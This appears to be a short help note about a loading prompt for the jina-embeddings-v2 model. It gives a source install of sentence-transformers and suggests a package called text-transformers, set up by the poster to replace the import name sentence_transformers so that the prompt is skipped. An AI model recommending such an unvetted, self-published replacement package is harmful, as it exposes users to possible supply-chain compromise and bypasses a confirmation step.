        raw: 'This will work but cause a "yes/no" prompt to be triggered whenever
          the model is loaded.

          To disable the prompt a source install of `sentence_transformers` is required.

          You can install `sentence_transformers` from source using:

          ```bash

          git clone git@github.com:UKPLab/sentence-transformers.git

          pip install ''sentence-transformers/''

          ```

          If the source install is difficult for your use case, consider installing
          `text-transformers` instead.

          I have set it up currently to be a drop in replacement for `sentence_transformers`.

          ```bash

          pip install text-transformers

          ```


          You will then be able to load the model without the "yes/no" prompt

          ```python

          from sentence_transformers import SentenceTransformer

          model = SentenceTransformer(''jinaai/jina-embeddings-v2-base-en'')

          ```'
